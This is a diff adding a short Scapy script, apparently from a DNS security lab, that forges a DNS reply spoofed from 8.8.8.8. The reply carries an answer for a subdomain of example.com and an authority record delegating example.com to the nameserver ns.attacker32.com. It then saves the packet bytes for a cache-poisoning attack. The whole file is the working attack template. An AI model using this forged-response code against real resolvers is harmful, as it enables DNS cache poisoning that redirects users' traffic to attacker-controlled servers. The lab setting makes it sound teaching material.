@@ -1,0 +1,21 @@
+from scapy.all import *
+
+name = "aaaaa.example.com"
+
+dns = DNS(
+    id=0xAAAA,
+    qr=1,
+    aa=1,
+    rd=1,
+    qd=DNSQR(qname=name),
+    an=DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200),
+    ns=DNSRR(rrname="example.com", type='NS', rdata="ns.attacker32.com", ttl=259200)
+)
+
+ip = IP(src="8.8.8.8", dst="172.30.105.51")   # ⚠️ CHANGE ICI
+udp = UDP(sport=53, dport=33333)
+
+pkt = ip/udp/dns
+
+with open("ip_resp.bin", "wb") as f:
+    f.write(bytes(pkt))
